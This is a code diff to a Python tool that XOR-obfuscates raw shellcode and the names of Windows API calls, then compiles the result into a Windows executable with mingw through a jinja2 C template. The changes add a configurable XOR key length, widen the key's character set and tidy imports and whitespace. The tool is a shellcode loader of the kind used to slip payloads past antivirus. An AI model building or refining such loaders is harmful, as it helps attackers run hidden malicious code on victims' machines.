@@ -21,8 +21,7 @@ import argparse
 import subprocess
 import tempfile
 
-from jinja2 import Environment, FileSystemLoader
-from os import path
+from jinja2 import Environment
 from random import shuffle
 from string import ascii_letters, digits
 from sys import exit
@@ -112,17 +111,15 @@ def xor_c(*xorArgs):
 class ExecutableFactory:
 
 	def __init__(self):
-
 		self.c = Environment()
 
 
 	def render_template(self, template_params):
-
 		template = self.c.from_string(templates_simple)
 		content = template.render(**template_params)
 		return content
 
-	
+
 	def compile_template(self, source, out_file):
 		source_file = tempfile.mkstemp(suffix='.c', text=True)[1]
 
@@ -135,12 +132,12 @@ class ExecutableFactory:
 
 		try:
 			subprocess.check_output(cmd)
-	
+
 		except FileNotFoundError:
 			print(f'[!] Compiler "{compiler}" not found in $PATH.')
 			print(f'\ntry running the following:\n\tsudo apt-get install g++-mingw-w64-x86-64\n')
 			exit(1)
-	
+
 		except Exception as error:
 			print('[!] Unknown error.')
 			print(error)
@@ -158,7 +155,7 @@ class ExecutableFactory:
 
 	def generate_key(self, strings, key_length):
 
-		key_material = list((digits + ascii_letters).encode('utf-8'))
+		key_material = list((digits + ascii_letters + '_.+-').encode('utf-8'))
 		key = []
 
 		for i in range(key_length):
@@ -178,7 +175,7 @@ class ExecutableFactory:
 		return bytes(key)
 
 
-	def generate(self, shellcode, out_file):
+	def generate(self, shellcode, key_length, out_file):
 
 		key = self.generate_key([
 			#b'Kernel32.dll',
@@ -187,7 +184,7 @@ class ExecutableFactory:
 			b'VirtualProtectEx',
 			b'WaitForSingleObject',
 			shellcode],
-			16
+			key_length
 		)
 
 		template_params = {
@@ -207,6 +204,7 @@ def main():
 
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-f', '--bin', required=True, help='Raw shellcode file')
+	parser.add_argument('-l', '--key-length', default=17, help='XOR key length')
 	parser.add_argument('-o', '--output', default='simple.exe', help='Output file')
 	args = parser.parse_args()
 
@@ -214,7 +212,7 @@ def main():
 		shellcode = file.read()
 
 	ef = ExecutableFactory()
-	ef.generate(shellcode, args.output)
+	ef.generate(shellcode, args.key_length, args.output)
 
 
 if __name__ == '__main__':
